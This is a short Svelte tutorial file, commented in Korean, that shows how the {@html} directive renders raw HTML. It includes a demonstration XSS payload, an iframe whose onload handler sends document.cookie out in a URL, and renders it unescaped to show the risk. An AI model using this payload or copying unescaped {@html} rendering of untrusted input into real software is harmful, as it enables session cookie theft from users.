<!-- Svelte에 원시 HTML 작성하기 -->

<script>
    let h1 = '<h1>Hello ttoobi</h1>'
    let xss = '<iframe onload="document.location=`https://?${document.cookie}`"></iframe>'

    // 외부에서 작성한 자바스크립트가 실행될 수 있다
</script>

{@html h1}
<!-- at-sign html을 넣어서 html로 해석할 수 있게 보간 -->
{@html xss}